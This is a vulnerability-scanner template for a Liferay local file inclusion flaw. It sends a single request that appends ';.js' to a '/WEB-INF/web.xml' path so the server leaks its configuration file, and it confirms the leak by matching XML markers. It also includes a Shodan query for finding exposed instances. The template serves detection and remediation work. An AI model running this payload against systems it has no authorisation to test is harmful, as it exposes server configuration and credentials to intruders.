id: liferay-resource-leak

info:
  name: Liferay - 本地文件包含漏洞
  author: DhiyaneshDk
  severity: high
  description: Liferay - 本地文件包含 存在本地文件包含漏洞。攻击者可借此读取服务器本地敏感文件、配置凭证或应用源码，为进一步入侵提供条件。
  remediation: |
    - 尽快升级受影响组件并移除危险功能、调试接口或可被外部调用的执行链路。
    - 结合主机侧日志、计划任务和 Web 根目录文件进行排查，确认是否已被植入后门或执行恶意命令。
  reference:
    - https://github.com/ilmila/J2EEScan/blob/master/src/main/java/burp/j2ee/issues/impl/LiferayI18nServletResourceLeaks.java
  classification:
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N
    cvss-score: 7.5
    cwe-id: CWE-22
    cpe: cpe:2.3:a:liferay:liferay_portal:*:*:*:*:*:*:*:*
  metadata:
    verified: true
    max-request: 1
    shodan-query: title:"Liferay"
    product: liferay_portal
    vendor: liferay
  tags: liferay,lfi,j2ee,vuln

http:
  - method: GET
    path:
      - "{{BaseURL}}/en/WEB-INF/web.xml;.js"

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<web-app id="
          - "<?xml"
        condition: and

      - type: word
        part: header
        words:
          - "application/xml"

      - type: status
        status:
          - 200
